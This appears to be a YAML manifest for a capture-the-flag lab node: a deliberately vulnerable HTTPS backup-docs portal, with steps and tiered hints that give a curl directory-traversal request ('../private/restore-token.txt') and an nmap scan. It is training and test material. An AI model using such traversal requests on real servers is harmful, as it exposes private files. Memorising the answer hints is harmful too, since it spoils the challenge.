manifest_version: 1
id: https_directory_traversal_backups
kind: flag-node-generator
name: 'HTTPS: Directory Traversal Backups'
description: TLS backup documentation portal with a vulnerable download path reaching
  private restore notes.
hint_template: Check how the document service confines requested file paths.
runtime:
  type: docker-compose
  compose_file: docker-compose.yml
  service: generator
env:
  WEB_VARIANT_ID: https_directory_traversal_backups
inputs:
- name: seed
  type: string
  required: true
- name: node_name
  type: string
  required: true
- name: flag_prefix
  type: string
  required: false
- name: web_port
  type: number
  required: false
  default: 8443
artifacts:
  requires:
  - Knowledge(ip)
  produces:
  - Flag(flag_id)
  - FlagDelivery(mode)
  - FlagFile(path)
  - File(path)
  - PortForward(host, port)
  - Directory(host, path)
  - Endpoint(path)
  - Version(service)
  - Vulnerability(host, type)
injects:
- site
inject_candidate_paths:
- /var/www/backup-docs
- /srv/https/backup-docs
- /opt/recovery/docs
- /home/www-data/restore
access_instructions:
  title: Directory Traversal in HTTPS Backup Docs
  steps:
  - step: 1
    title: Fetch a normal restore runbook
    instructions: '```bash

      curl -k ''https://{{NODE}}:{{PORT}}/download?file=restore-runbook.txt''

      ```

      '
  - step: 2
    title: Traverse to the restore token
    instructions: '```bash

      curl -k ''https://{{NODE}}:{{PORT}}/download?file=../private/restore-token.txt''

      ```

      '
  - step: 3
    title: Record the restore note
    instructions: Record the flag recovered via traversal.
hint_levels:
  low:
  - Check how the document service confines requested file paths.
  medium:
  - 'Service: Directory Traversal in HTTPS Backup Docs. Target: {{THIS_NODE_NAME}}; TCP port: {{OUTPUT.PortForward(host, port)}}.'
  - |-
    Check the assigned port:
    ```bash
    nmap -sT -sV -p {{OUTPUT.PortForward(host, port)}} {{THIS_NODE_NAME}}
    ```
  high:
  - 'Answer: {{OUTPUT.Flag(flag_id)}}'
  - |-
    Fetch a normal restore runbook:
    ```bash
    curl -k 'https://{{THIS_NODE_NAME}}:{{OUTPUT.PortForward(host, port)}}/download?file=restore-runbook.txt'
    ```
  - |-
    Traverse to the restore token:
    ```bash
    curl -k 'https://{{THIS_NODE_NAME}}:{{OUTPUT.PortForward(host, port)}}/download?file=../private/restore-token.txt'
    ```
